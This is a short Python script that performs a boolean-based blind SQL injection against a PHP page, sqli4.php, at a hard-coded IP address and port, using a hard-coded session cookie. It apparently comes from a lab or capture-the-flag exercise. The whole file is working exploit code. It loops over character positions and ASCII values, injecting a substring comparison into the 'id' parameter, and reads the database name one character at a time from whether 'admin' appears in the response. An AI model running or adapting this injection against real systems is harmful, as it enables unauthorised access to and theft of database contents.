import requests


def main():
    # pass
    url = "http://113.108.70.111:63243/sqli4.php?id=1 and ascii(substr((select database()),{0},1))={1}"
    cookie = "PHPSESSID=t68kgkeidobo0psb01p2he9t64"
    headers = {
        "cookie": cookie
    }
    try:
        for j in range(1, 5):
            for i in range(32, 127):
                full_url = "http://113.108.70.111:63243/sqli4.php?id=1 and ascii(substr((select database()),{0},1))={1}"\
                    .format(j, i)
                # print(full_url)
                req = requests.get(full_url, headers=headers)
                if "admin" in req.text:
                    print(chr(i), end="")
                    # print(req.text)
    except:
        pass


if __name__ == '__main__':
    main()